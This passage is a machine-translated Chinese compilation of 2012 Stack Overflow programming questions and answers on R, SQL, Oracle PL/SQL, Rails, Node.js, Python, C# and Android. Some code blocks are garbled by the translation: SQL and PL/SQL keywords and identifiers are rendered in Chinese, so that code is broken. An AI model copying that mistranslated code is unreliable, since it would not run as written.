我知道增量适用于 jpeg 和 png。它的编码有点复杂，但您应该能够在此处或 Apple 的网站上找到示例代码。无法知道它会对动画 GIF 做什么。如果它不能满足您的需求，您肯定可以找到一个开源 libgif 库，您显然需要将其移植到 iOS。我在一个项目中使用了 libjpeg turbo 来获得 JPEG 的增量解码。

您引用的 Quartz 方法的一个问题是它总是从图像开始逐步解码。因此，如果您像我一样拥有一个非常大的图像，那么随着下载大小的增加，每次请求增量图像所需的时间就越长。我实际上为此烧毁了一个 DTS 事件——Apple 工程师同意如果他们缓存中间图像会很好，这样每个请求都会建立在最后一个图像上，但他们现在没有。

# r - 如何从 R 脚本调用可执行文件

> ID：13524355
> 
> 赞同：3
> 
> 时间：2012-11-23T06:53:52.153
> 
> 标签：r

我有一个 CUDA 代码，我已经编译并拥有它的可执行文件。现在我想从 R 脚本调用这个可执行文件并从 R 脚本本身传递参数？是否可以？如果是，请解释如何？

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-11-23T07:01:39.313

要调用任何外部可执行文件，您可以使用该`system`函数：

```
system("cuda_exe arg1 arg2") 
```

`cuda_exe`cuda 可执行文件在哪里，并且`arg*`是传递给脚本的命令行参数。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2021-02-07T13:41:37.110

`system`比is更跨平台的替代方案`system2`。它可以在没有`/bin/sh`.

```
system2("cuda_exe", c("arg1", "arg2")) 
```

它不需要 shell，但是像`*`glob 这样的 shell 语法不起作用，你必须学习 R 的做事方式，比如`list.files(pattern = ".*.csv")`而不是`"*.csv"`. 结果是您不必摆弄`paste()`来构建命令行。

# php - 可能使用过滤器选择列名

> ID：13524360
> 
> 赞同：1
> 
> 时间：2012-11-23T06:54:27.043
> 
> 标签：php, mysql

我尝试在`SELECT`语句和查询时过滤我的列名，如下所示：

```
$query = "select p.id, p.name from `person` p"; 
```

列“名称”数据如下所示：

安吉丽娜朱莉 | 布拉德皮特 | 大卫贝克汉姆……

**筛选 ：**

选择列名称（p.name）时，我只需要选择“名称”字符串，然后在空间后删除所有字符串。意思是当我选择列时，我只选择名字安吉丽娜、布拉德、大卫......

**我知道我们可以使用 implode 来做到这一点，但我想在查询行中进行过滤。*

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-23T07:01:09.330

试试这个：

```
select p.id, left(p.name,locate(' ',p.name)-1) from `person` p 
```

### [SQL Fiddle 演示](http://sqlfiddle.com/#!2/d41d8/4054)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-23T07:01:27.683

试试这个：

```
SELECT p.id, SUBSTRING_INDEX(p.name , ' ', 1) `name`  FROM `person` p; 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-11-23T07:02:58.563

试试这个：：

```
select substring_index(p.name,' ',1) as name, p.id from person p 
```

# concurrency - 在 Oracle 应用程序中使用并发程序的步骤

> ID：13524365
> 
> 赞同：3
> 
> 时间：2012-11-23T06:54:49.360
> 
> 标签：concurrency, plsql

如果我在 oracle SQl Developer 中创建 PL/SQL 过程，那么如何在 Oracle Application 中访问该 PL/SQL 过程。我还需要在 oracle 应用程序中使用并发程序的步骤，以便当我在 oracle 应用程序中运行可执行文件时，我应该在 oracle SQL 开发人员中获得 Oracle 应用程序中执行过程的输出。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-23T07:08:44.350

创建或替换包示例

程序演示（errbuf 输出 NOCOPY varchar2，重新编码输出 NOCOPY varchar2）；

结束样本；/

创建或替换包体示例

procedure demo(errbuf out NOCOPY varchar2, retcode out NOCOPY varchar2) is begin -- -- 如果你想写一些输出调用： -- FND_FILE.put_line(FND_FILE.output,'Starting processing:'); -- -- 注意： -- 写入日志使用 FND_FILE.log 而不是 FND_FILE.output --

--

FND_FILE.put_line(FND_FILE.output,'完成！');

犯罪;

-- 返回 0 表示成功完成。errbuf := ''; 重新编码：='0'；

其他人则异常 errbuf := sqlerrm; 重新编码：='2'；结束演示；

结束样本；

登录到 Oracle 应用程序

# 1.定义可执行文件

导航：并发 -> 程序 -> 可执行文件：

可执行文件：sample_demo 简称：asample_demo 应用程序：应用程序对象库---更改您的要求
描述：APPS pl/sql 并发程序Exe 方法演示：PL/SQL 程序Exe 文件名：sample.demo

# 2.定义程序

导航：并发 -> 程序 -> 定义：

```
Program: Demonstration of APPS pl/sql concurrent program 
```

简称：PACKAGE_PROCEDURE 应用程序：应用程序对象库

可执行文件：asample_demo

# 3\. 将程序添加到 SYSADMIN 责任报告组

导航：安全 -> 责任 -> 请求

查询“系统管理员报告”组——使用 F11 和 Ctrl+F11

在请求详细信息表单中添加以下行：

类型：程序名称：APPS pl/sql并发程序演示

您现在可以通过 APPS Concurrent Manager 运行此 pl/sql package.procedure。

# 4.从标准请求提交运行程序

转到 SRS（标准请求提交）提交您的程序

:-)

# android - 如何创建 web 服务来连接 android 和 microsoft sql server 数据库？

> ID：13524366
> 
> 赞同：0
> 
> 时间：2012-11-23T06:54:51.123
> 
> 标签：android, web-services

我想创建 Web 服务，它将执行逻辑操作，例如从 SQL Server 数据库读取、写入、插入、更新记录并返回 json 对象中的响应。

阅读完这些回复后，我想更新 android 本地 SQLite 数据库中的值......

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-23T07:03:07.617

如果你想自己构建它，你可以在一个类中编写一个 HTTP Post Request 方法。作为请求，帖子项“请求”可以携带该值。这可以是“读取”、“写入”、“插入”、“更新”、“收集所有记录”、“全部删除”等。使用其他参数，您可以发送其他详细信息。

您尚未指定将用于 Web 服务的语言。它可能是 ASP.NET，因为您使用的是 SQL Server。因此，在“onload”请求中，您可以从“Request”属性中获取详细信息，并根据“request”的值，将 Web 服务路由到一个方法。该方法连接到 SQL Server，完成请求并返回给 Android。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-23T06:57:25.613

谷歌“REST 网络服务 Java”。你应该接受它。

# ruby-on-rails - 如何在 Ruby on Rails 中禁用对 respond_to 模板的需要？

> ID：13524367
> 
> 赞同：2
> 
> 时间：2012-11-23T06:54:52.450
> 
> 标签：ruby-on-rails, ruby-on-rails-3

我收到以下错误：

```
ActionView::MissingTemplate (Missing template product/create, application/create with {:locale=>[:en], :formats=>[:js, :html], :handlers=>[:erb, :builder, :haml]} 
```

控制器代码：

```
 def create
    product = Product.new(params[:product])
    product.save
  end 
```

我得到这个的原因是因为我没有针对此操作或模板文件的 respond_to 块。这是我通过 AJAX 运行以创建`product`. 将其发送到服务器后，我不需要/不想回复任何内容。有没有办法禁用它，所以我不会收到这些错误？我能想到的最好的方法是创建一个`respond_to`块`format.js`并创建一个`_create.js.erb`空白但看起来像黑客的文件。

谢谢

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-23T06:58:55.910

只需添加

```
render nothing: true 
```

[http://guides.rubyonrails.org/layouts_and_rendering.html#rendering-nothing](http://guides.rubyonrails.org/layouts_and_rendering.html#rendering-nothing)

# visual-studio-2010 - 如何控制 Pex 深挖

> ID：13524368
> 
> 赞同：1
> 
> 时间：2012-11-23T06:55:01.687
> 
> 标签：visual-studio-2010, unit-testing, moles, pex

当我尝试对调用某些系统文件和函数的源进行 Pex 探索时。很多时候，我在系统文件类函数中超出了路径界限。如何让 Pex 仅在我的代码上运行探索，并且可能更深一层。

# node.js - 当包含的应用服务器使用 nodejs cluster.fork 时，誓言单元测试被多次执行

> ID：13524369
> 
> 赞同：0
> 
> 时间：2012-11-23T06:55:19.580
> 
> 标签：node.js, vows

我的应用服务器使用 node.js 集群 API cluster.fork() 来分叉多个子进程。这工作正常。

但是，当我尝试使用 vows 进行单元测试时，由于在我的应用服务器中调用了 cluster.fork()，测试也运行了多次；当我在测试代码中实例化服务器时，如下所示：

基本测试.js

```
var vows = require('vows');
var MyAppServer = require('../my_app');

// start the server 
var app = MyAppServer.start();    

var suite = vows.describe('My Tests');
suite.discuss('connections API')
    .addBatch({ ... })
    .export(module); 
```

在这种情况下，如何防止测试代码多次运行？这个测试包含在 npm 测试中，所以我需要一种方法来在测试本身中实例化我的应用服务器。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-23T09:20:14.403

在顶部你可以做

```
var cluster = require('cluster'); 
```

然后将套件包装在`if`：

```
if (cluster.isMaster) {
    var suite = ...
    ...
} 
```

有关更多信息`isMaster`，请查看[文档](http://nodejs.org/api/cluster.html#cluster_cluster_ismaster)

# python - Python：将函数作为类的方法调用

> ID：13524370
> 
> 赞同：4
> 
> 时间：2012-11-23T06:55:22.257
> 
> 标签：python

让我们从一些代码开始：

```
def func(*x):
    print('func:', x)

class ABC:
    def __init__(self, f):
        self.f1 = f

    def f2(*x):
        print('f2:', x) 
```

现在我们做一些测试：

```
>>> a = ABC(func)
>>> a.f1(10)
func: (10,)
>>> a.f2(10)
f2: (<__main__.ABC object at 0xb75381cc>, 10)
>>> a.f3 = func
>>> a.f3(10)
func: (10,)
>>> a.f1
<function func at 0xb74911ec>
>>> a.f2
<bound method ABC.f2 of <__main__.ABC object at 0xb75381cc>>
>>> a.f3
<function func at 0xb74911ec> 
```

请注意，这`func`是一个普通函数，我们将其作为`f1`类的方法。

我们可以看到这`f2`是将类实例作为第一个参数，但不是`f1`，`f3`即使所有函数都被称为类方法。我们还可以看到，如果我们将普通函数作为类的方法来调用，Python 不会从中创建绑定方法。

那么，即使我们将其作为类的方法调用，为什么还要`f1`或不将类实例传递给它呢？`f3`而且，Python 是如何知道我们将外部函数作为方法调用的，所以它不应该将实例传递给它。

**- 编辑 -**

好的，所以基本上我做错的是我将函数附加到实例上而不是类对象本身上。因此，这些函数简单地成为实例属性。我们可以通过以下方式检查：

```
>>> ABC.__dict__
... contents...
>>> a.__dict__
{'f1': <function func at 0xb74911ec>, 'f3': <function func at 0xb74911ec>} 
```

另请注意，此 dict 不能分配给：

```
>>> ABC.__dict__['f4'] = func
TypeError: 'dict_proxy' object does not support item assignment 
```

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-11-23T07:09:29.547

您在检查对象时部分回答了您自己的问题。在 Python 中，对象的行为类似于命名空间，因此第一个属性指向一个函数，第二个属性指向一个方法。

这是动态添加方法的方法：

```
from types import MethodType

def func(*x):
    print('func:', x)

class ABC:
    def __init__(self, f):
        self.f1 = MethodType(f, self, self.__class__)

    def f2(*x):
        print('f2:', x)

if __name__ == '__main__':
    a = ABC(func)
    print a.f1(10)
    print a.f2(10)
    a.f3 = MethodType(func, a, ABC)
    print a.f3(10) 
```

请注意，它将方法绑定到您的实例，而不是基类。为了对ABC 类进行[猴子补丁：](http://en.wikipedia.org/wiki/Monkey_patch)

```
>>> ABC.f4 = MethodType(func, None, ABC)
>>> a.f4(1)
('func:', (<__main__.ABC instance at 0x02AA8AD0>, 1)) 
```

Monkeypatching 在 Python 圈子中通常不受欢迎，尽管它在其他动态语言中很流行（尤其是在 Ruby 语言更年轻的时候）。

如果你曾经求助于这种强大而危险的技术，我的建议是：

*   永远，永远覆盖现有的类方法。只是不要。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-11-23T07:03:25.780

那是因为`f1`并且`f3`不是类方法，它们只是对定义在中的全局函数的引用`__main__`：

```
In [5]: a.f1
Out[5]: <function __main__.func>

In [8]: a.f3
Out[8]: <function __main__.func>

In [9]: a.f2
Out[9]: <bound method ABC.f2 of <__main__.ABC instance at 0x8ac04ac>> 
```

你可以做这样的事情来使全局函数成为类方法：

```
In [16]: class ABC:
    def __init__(self,f):
        ABC.f1=f
    def f2(*x):    
        print('f2',x)
   ....:         

In [17]: a=ABC(func)

In [18]: a.f1(10)
('func:', (<__main__.ABC instance at 0x8abb7ec>, 10)) 
```

# c# - 如何调用与现有方法同名的扩展方法？

> ID：13524372
> 
> 赞同：27
> 
> 时间：2012-11-23T06:55:29.213
> 
> 标签：c#, extension-methods

我有类似的代码

```
public class TestA
{
    public string ColA { get; set; }
    public string ColB { get; set; }
    public string ColC { get; set; }
    public void MethodA()
    {
        MessageBox.Show("Original A1.");
    }
}

static class ExtenstionTest
{

    public static void MethodA(this TestA A1)
    {
        MessageBox.Show("Extended A1.");
    }
} 
```

现在，如果我像这样调用 MethodA

```
TestA a = new TestA();
        a.MethodA(); 
```

它总是会调用 Original 方法。如何调用扩展方法。

* * *

## 回答 #1

> 赞同：41
> 
> 时间：2012-11-23T06:57:44.210

您不能将扩展方法作为普通扩展方法调用。实例方法覆盖具有相同签名的扩展方法

编辑：

您可以将其称为静态方法

```
ExtensionTest.MethodA(a); 
```

* * *

## 回答 #2

> 赞同：18
> 
> 时间：2012-11-23T06:59:25.103

您不能将其*称为扩展方法*。就作为一种扩展方法而言，它在这一点上基本上没用。（我个人希望这是一个警告，但没关系。）

编译器在尝试解析扩展方法之前尝试所有可能的*实例方法。*从 C# 4 规范的第 7.6.5.2 节：

> 在一种形式的方法调用中[...]，如果调用的正常处理没有找到适用的方法，则尝试将构造处理为扩展方法调用。

然后：

> 上述规则意味着实例方法优先于扩展方法

你可以像普通的静态方法一样调用它：

```
// Fixed typo in name
ExtensionTest.MethodA(a); 
```

* * *

## 回答 #3

> 赞同：8
> 
> 时间：2012-11-23T06:59:17.577

[扩展方法 - MSDN](http://msdn.microsoft.com/en-us/library/vstudio/bb383977.aspx)

> **永远不会调用**与接口或类方法具有**相同名称和签名**的扩展方法。在编译时， **扩展方法的优先级总是低于**类型本身定义的实例方法。

 ****您可以将扩展方法称为类的常规静态方法。

```
ExtenstionTest.MethodA(a); 
```

来自[MSDN](http://msdn.microsoft.com/en-us/library/vstudio/bb383977.aspx)

> 换句话说，如果一个类型有一个名为 Process(int i) 的方法，并且你有一个具有相同签名的扩展方法，编译器将始终绑定到实例方法。当编译器遇到方法调用时，它首先在类型的实例方法中查找匹配项。如果未找到匹配项，它将搜索为该类型定义的任何扩展方法，并绑定到它找到的第一个扩展方法。下面的示例演示了编译器如何确定要绑定到哪个扩展方法或实例方法。

* * *

## 回答 #4

> 赞同：3
> 
> 时间：2012-11-23T06:58:36.707

您可以像任何其他静态方法一样调用扩展方法：

```
ExtenstionTest.MethodA(a); 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-11-23T07:07:37.937

正如其他人建议的那样，您不能调用此方法。调用它的唯一方法是：

```
TestA a = new TestA();
ExtenstionTest.MethodA(a); 
```****

# oracle - 在存储过程中的删除语句后使用游标

> ID：13524382
> 
> 赞同：0
> 
> 时间：2012-11-23T06:56:27.257
> 
> 标签：oracle, stored-procedures, transactions, plsql, cursor

> **可能重复：**
> [Oracle 在同一事务期间访问更新的记录](https://stackoverflow.com/questions/13514303/oracle-accessing-updated-records-during-the-same-transaction)

我有一个有点像这样的 Oracle 存储过程（实际的 sql 不同）

```
CREATE OR REPLACE PROCEDURE mysp
IS
v_copied_row table%ROWTYPE ;

 CURSOR p_copied_rows IS
 select *
 from table ;

BEGIN
  delete from table
where <some condition>

OPEN p_copied_rows ;
LOOP
FETCH p_copied_rows into v_copied_rows ;
<do something with fetched row>
END LOOP
close p_copied_rows;
END; 
```

理想情况下，我期望删除的行不应该是我从游标中获取的结果集的一部分，但那些是。

我是甲骨文的新手，想了解我是否在这里做错了什么？

PS 我必须将游标用于一些复杂的事情，所以用 SQL 替换游标不是一种选择。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-23T07:29:35.410

如果您的实际代码与您发布的代码匹配，则光标不会返回您删除的行

如果我创建一个有 100 行的表

```
SQL> ed
Wrote file afiedt.buf

  1  create table foo
  2  as
  3  select level col1
  4    from dual
  5* connect by level <= 100
SQL> /

Table created. 
```

然后创建一个 PL/SQL 块来复制您发布的内容，删除 98 行，打开的游标将仅返回 2 行

```
SQL> select count(*) from foo;

  COUNT(*)
----------
       100

SQL> declare
  2    cursor non_deleted_rows
  3        is select *
  4             from foo;
  5    l_rec foo%rowtype;
  6  begin
  7    delete from foo
  8     where col1 <= 98;
  9
 10    open non_deleted_rows;
 11    loop
 12      fetch non_deleted_rows into l_rec;
 13      exit when non_deleted_rows%notfound;
 14
 15      dbms_output.put_line( l_rec.col1 );
 16    end loop;
 17  end;
 18  /
99
100

PL/SQL procedure successfully completed. 
```

现在，如果您在发出 之前打开游标`DELETE`，游标将返回已删除的行。也许在您的实际代码中，该`OPEN`语句位于`DELETE`.

# objective-c - 在 xcode 4.5 中使用 Json 进行商店搜索

> ID：13524384
> 
> 赞同：2
> 
> 时间：2012-11-23T06:57:00.643
> 
> 标签：objective-c, xcode4.5

我是新来的`xcode`。我不明白为什么没有错误，`Xcode`但是当我运行它时，模拟器一直在加载，并且我遇到了错误。对不起，如果我的英语不好。我认为解析数据时出了点问题，但我只是不知道如何修复它。

```
- (void)performSearch
{

    if ([self.searchBar.text length] > 0) {
        [self.searchBar resignFirstResponder];

        [queue cancelAllOperations];
        [[AFImageCache sharedImageCache] removeAllObjects];
        [[NSURLCache sharedURLCache] removeAllCachedResponses];

        isLoading = YES;
        [self.tableView reloadData];

        searchResults = [NSMutableArray arrayWithCapacity:10];

        NSURL *url = [self urlWithSearchText:self.searchBar.text category:self.segmentedControl.selectedSegmentIndex];
        NSURLRequest *request = [NSURLRequest requestWithURL:url];
        NSLog(@"REQUEST: %@", request);

        AFJSONRequestOperation *operation = [AFJSONRequestOperation
                                             JSONRequestOperationWithRequest:request
                                             success:^(NSURLRequest *request, NSHTTPURLResponse *response, id JSON) {
                                                 NSLog(@"Success!");

                                             } failure:^(NSURLRequest *request, NSHTTPURLResponse *response, NSError *error, id JSON) {
                                                 NSLog(@"Failure! %@", error);
                                             }];
        [operation start];
        [operation waitUntilFinished];
                  // ???
        [queue addOperation:operation];
    }
}

2012-11-23 11:30:12.429 StoreSearch[5803:c07] REQUEST: <NSURLRequest http://itunes.apple.com/search?term=tr&limit=200&entity=>
2012-11-23 11:30:14.202 StoreSearch[5803:c07] *** WebKit discarded an uncaught exception in the webView:shouldInsertText:replacingDOMRange:givenAction: delegate: <NSInvalidArgumentException> *** -[NSOperationQueue addOperation:]: operation is finished and cannot be enqueued
2012-11-23 11:30:14.211 StoreSearch[5803:c07] Failure! Error Domain=com.alamofire.networking.error Code=-1016 "Expected content type {(
    "text/json",
    "application/json"
)}, got text/javascript" UserInfo=0xdf348b0 {NSErrorFailingURLKey=http://itunes.apple.com/search?term=tr&limit=200&entity=, NSLocalizedDescription=Expected content type {(
    "text/json",
    "application/json"
)}, got text/javascript} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-23T07:35:11.067

似乎您得到的响应不是 json。您能否尝试从终端卷曲请求 URL 并查看它给出的响应。

# elasticsearch - 索引后如何从 Elastic Search 获得响应？

> ID：13524385
> 
> 赞同：0
> 
> 时间：2012-11-23T06:57:02.977
> 
> 标签：elasticsearch, pyes

我正在使用带有 Elastic Search 的 CouchDB 河流插件。在我的 Web 应用程序中，我使用 CouchDB 的批量插入将文档插入到 CouchDB 中。这会触发更改提要，ES 会读取它来索引我的文档。现在的问题是我的 web ui 没有显示任何内容，因为 ES 仍在索引文档。

顺便说一句，我正在使用 PyES 与 ES “交谈”。我可以调用任何函数来了解 Elastic Search 是否正忙于索引？

太感谢了。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-23T07:38:44.983

即使 ES 正在建立索引，ES 也应该回答查询。你能检查一下吗

卷曲 l​​ocalhost:9200/_search?q=*

从 couchDb 索引时，您的索引中有文档吗？

[更新] 你必须知道 Elasticsearch 是一个近乎实时的搜索引擎。因此，您必须等待几秒钟才能搜索您的文档。您可以立即检索您的文档，但您需要等待刷新过程。

您可以手动触发[刷新 API](http://www.elasticsearch.org/guide/reference/api/admin-indices-refresh.html)。但它可能会大大减慢您的插入速度。

它有帮助吗？

# mysql - MySQL 多对多搜索

> ID：13524386
> 
> 赞同：4
> 
> 时间：2012-11-23T06:57:09.730
> 
> 标签：mysql, search, group-by, where, having

我已经开始研究我的第一个 MySQL 数据库，但遇到了一个简单的问题。

我的电影按“多对多”关系按类型分类：

```
“电影”表
+---------+--------------------+
|movie_id |movie_title |
+---------+--------------------+
|1 |印第安纳琼斯 |
|2 |死者肖恩 |
+---------+--------------------+

“流派”表
+---------+-----------+
|流派 ID |流派名称 |
+---------+-----------+
|1 |冒险 |
|2 |喜剧 |
|3 |恐怖 |
+---------+-----------+

'movie_genres' 表
+---------+---------+
|movie_id |流派_id |
+---------+---------+
|1 |1 |
|2 |2 |
|2 |3 |
+---------+---------+

```

我要做的是按流派搜索我的电影表，并显示每部电影的所有流派，例如：

```
搜索“恐怖”

+------------------+--------------+
|电影名称 |类型名称 |
+------------------+--------------+
|死者肖恩 |喜剧，恐怖 |
+------------------+--------------+

```

这是我用来搜索恐怖电影的查询

```
    选择 m.movi​​e_title, GROUP_CONCAT(g.genre_name SEPARATOR ', ') 作为流派名称
    FROM 电影
    左加入genre_movies gm ON gm.movi​​e_id = m.movi​​e_id
    LEFT JOIN 流派 g ON g.genre_id = gm.genre_id
    按 m.movi​​e_id 分组
    有流派名称 LIKE '%horror%'

```

我遇到的问题是，此查询在过滤之前检索了所有表的全部内容，我认为这是非常低效的。有没有更好的方法可以在显示所有相关类型的同时按一种类型进行搜索？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-23T07:09:33.790

试试这个：

```
SELECT m.movie_title, A.genre_names
FROM movies m
INNER JOIN (SELECT gm.movie_id, GROUP_CONCAT(g.genre_name SEPARATOR ', ') AS genre_names
    FROM genre_movies gm INNER JOIN genres g ON g.genre_id = gm.genre_id
    GROUP BY gm.movie_id) AS A ON m.movie_id = A.movie_id 
WHERE genre_names LIKE '%horror%' 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-23T07:05:31.963

为什么不将genre_id 保存在电影表中？

像这样的东西：

```
'movies' Table
+---------+------------+---------------------+
|movie_id |movie_genre |movie_title          |
+---------+----------------------------------+
|1        |1           | Indiana Jones       |
|2        |2 ,3        | Shaun of the Dead   |
+---------+----------------------------------+ 
```

所以你只需要2张桌子。您可以轻松过滤查询中的数据。

> 我要做的是按流派搜索我的电影表，并显示每部电影的所有流派，例如：

可能是这样的：

```
SELECT fields FROM table WHERE movie_genre LIKE %movie_genre_id% 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-11-23T07:21:11.393

```
SELECT m.movie_title, GROUP_CONCAT(g.genre_name SEPARATOR ', ') as genre_names
FROM  movies m
      INNER JOIN
      (
        SELECT gm.movie_id
        FROM   genre_movies gm 
               INNER JOIN genres g 
                  ON g.genre_id = gm.genre_id
        WHERE  g.genre_name = 'horror'
        GROUP BY gm.movie_id
      ) a ON a.movie_id = m.movie_id
      INNER JOIN genre_movies gm ON gm.movie_id = m.movie_id
      INNER JOIN genres g ON g.genre_id = gm.genre_id
GROUP BY m.movie_id 
```

*   [SQLFiddle 演示](http://sqlfiddle.com/#!2/255a5/1)

# android - 通过更改 Android 中的应用程序语言来更改默认手机语言？

> ID：13524388
> 
> 赞同：1
> 
> 时间：2012-11-23T06:57:25.130
> 
> 标签：android

有没有办法通过更改应用程序的语言来更改手机的语言。

我的意思是当我更改应用程序的语言时，默认电话语言也会更改。

对此有什么想法吗，请在这里分享。

提前致谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-23T07:14:06.827

```
Locale locale = new Locale("en_US");
Locale.setDefault(locale);
Configuration config = new Configuration();
config.locale = locale;
context.getApplicationContext().getResources().updateConfiguration(config, null); 
```

然后

并在 res/values-ja 中为日语创建一个文件夹，或在 res/values-ar 中为阿拉伯语创建一个文件夹。

并制作 string.xml 文件并将您想要的语言放在布局中

它的 res/values-ar 用于阿拉伯语的示例——

```
<?xml version="1.0" encoding="UTF-8"?>
  <resources>
    <string name="spinner_label">حسب</string>
    <string name="app_name">فرق</string> 
    <string name="search">بحث:</string>
</resource> 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-23T07:15:22.923

我不知道它可以通过编程方式进行更改，但是在您更改应用程序语言后，您也可以要求用户更改设备语言，

要求用户更改设备语言

```
Intent intent = new Intent(Intent.ACTION_MAIN);
intent.setClassName("com.android.settings", "com.android.settings.LanguageSettings");            
startActivity(intent); 
```

更改应用语言

```
<activity
    android:name=".ui.SomeActivity"
    android:configChanges="locale"
    :
    :
</activity>

public static void setLanguage(Context context, String languageToLoad) {
    Log.d(TAG, "setting language");
    Locale locale = new Locale(languageToLoad); //e.g "sv"
    Locale systemLocale = SystemLocale.getInstance().getCurrentLocale(context);
    if (systemLocale != null && systemLocale.equals(locale)) {
       Log.d(TAG, "Already correct language set");
       return;
    }
    Locale.setDefault(locale);
    android.content.res.Configuration config = new android.content.res.Configuration();
    config.locale = locale;
    context.getResources().updateConfiguration(config, context.getResources().getDisplayMetrics());
    Log.d(TAG, "Language set");
} 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-11-23T07:21:52.647

将**android:configChanges="locale"**添加到 AndroidManifect 文件中的活动声明中。

然后从该活动的 onCreate 调用以下方法。

```
public static void setLanguage(Context context, String languageToLoad) {
  Log.d(TAG, "setting language");
  Locale locale = new Locale(languageToLoad); //e.g "sv"
  Locale systemLocale = SystemLocale.getInstance().getCurrentLocale(context);
   if (systemLocale != null && systemLocale.equals(locale)) {
   Log.d(TAG, "Already correct language set");
   return;
 }
 Locale.setDefault(locale);
 android.content.res.Configuration config = new android.content.res.Configuration();
 config.locale = locale;
 context.getResources().updateConfiguration(config,context.getResources().getDisplayMetrics());                                                            
 Log.d(TAG, "Language set");
  } 
```

# xamarin.ios - MonoTouch 中的 UIToolbar.Appearance.TintColor 在哪里？

> ID：13524390
> 
> 赞同：0
> 
> 时间：2012-11-23T06:57:45.767
> 
> 标签：xamarin.ios, ios6

我正在尝试通过 UIToolbar.Appearance.TintColor 为 UIToolbar 设置颜色，但这不存在。UINavigationBar.Appearance.TintColor 工作得很好。有没有办法全局设置工具栏的色调？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-25T17:34:14.687

这是 MonoTouch 中缺少的功能，我已修复此问题，下一个版本将包含此修复程序。

# php - PHP - 如何检测是否单击了下载文件的“确定”按钮？

> ID：13524392
> 
> 赞同：0
> 
> 时间：2012-11-23T06:57:50.260
> 
> 标签：php, download

有没有办法在 PHP 或 javascript 中知道用户是否在弹出下载框后点击了“确定”按钮？

![在此处输入图像描述](../Images/f914978b843b33650f1a0ac974c16c11.png)

我想计算对该特定文件的下载量，我想通过检测是否单击“确定”来做到这一点。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-23T06:59:38.237

我认为这是不可能的，即使使用 javascript。因为，该下载对话框超出了 javascript 的范围。您的问题没有解决方案。

您只能在不知道用户实际单击“确定”的情况下将计数器 +1 添加到下载计数器。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-23T07:36:18.333

谷歌浏览器中的强制下载方式不同。如果您单击链接，这将自动下载文件。不会显示这样的消息。因此，如果您正在为上述问题找到一些方法，这将不是一个跨浏览器兼容的解决方案。

# sql-server - sql server 中的表排序

> ID：13524394
> 
> 赞同：-2
> 
> 时间：2012-11-23T06:58:01.997
> 
> 标签：sql-server

我的表格数据喜欢

```
id LedgerName
1  "105 AAA"
2  "102 sss"
3  "GGGG"
4  "107 BBB"
5  "BBBB"
6  "101 TTT" 
```

我想对分类帐进行排序

```
6  "101 TTT"
2  "102 sss"
1  "105 AAA"
4  "107 BBB"
5  "BBBB"
3  "GGGG" 
```

正常订购方式不起作用。我使用 split 函数来拆分基于数字的排序，按 .. 如何解决这个问题

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-11-23T07:02:45.110

使用您在 LedgerName 上提供的常规订单的数据正在做您想做的事情。
下面是处理稍微复杂一点的数据的版本。

[SQL小提琴](http://sqlfiddle.com/#!3/931c3/1)

**MS SQL Server 2008 架构设置**：

```
create table YourTable
(
  id int,
  LedgerName varchar(20)
)

insert into YourTable values
(1,  '105 AAA'  ),
(2,  '1020 sss' ),
(3,  ' '        ),
(4,  null       ),
(5,  '0'        ),
(6,  '999 sss'  ),
(7,  '9999 sss' ),
(8,  'GGGG'     ),
(9,  '107 BBB'  ),
(10, 'BBBB'     ),
(11, '101 TTT'  ) 
```

**查询 1**：

```
select id,
       LedgerName
from YourTable
order by case when patindex('%[^0-9]%', isnull(LedgerName, '')+' ') = 1 then 1 else 0 end,
         cast(left(LedgerName, patindex('%[^0-9]%', LedgerName+' ')-1) as int),
         LedgerName 
```

**[结果](http://sqlfiddle.com/#!3/931c3/1/0)**：

```
| ID | LEDGERNAME |
-------------------
|  5 |          0 |
| 11 |    101 TTT |
|  1 |    105 AAA |
|  9 |    107 BBB |
|  6 |    999 sss |
|  2 |   1020 sss |
|  7 |   9999 sss |
|  4 |     (null) |
|  3 |            |
| 10 |       BBBB |
|  8 |       GGGG | 
```

# objective-c - 哪个是objective C更好的静态程序分析工具

> ID：13524396
> 
> 赞同：2
> 
> 时间：2012-11-23T06:58:17.283
> 
> 标签：objective-c, static-code-analysis

我需要检查我的代码是否遵循标准的编码指南，例如为目标 C 命名约定或未使用的代码等。如果你们使用任何这样的工具，那么它们的效率如何以及您在使用这些工具时的体验如何？

提前致谢。

# c# - 如何使用 c# 和 Xaml 在 Windows 8 应用程序中的每个组之前引用重复的相同按钮？

> ID：13524397
> 
> 赞同：2
> 
> 时间：2012-11-23T06:58:30.483
> 
> 标签：c#, xaml, windows-8, microsoft-metro

我正在使用 c# 和 XAML 开发一个 Windows 8 Metro 应用程序。我做了分组项目页面，并且在每个组之前重复了一个按钮列表。问题是我需要根据他所属的组来引用每个按钮，以便更改他将带我去的页面。这是我的页面的快照：

![在此处输入图像描述](../Images/ac2dadc8f0a764aa461590c9016be6cd.png)

我需要在我的代码中引用社交媒体图标（facebook、google+、...）这是我的代码：

```
<Page.BottomAppBar>
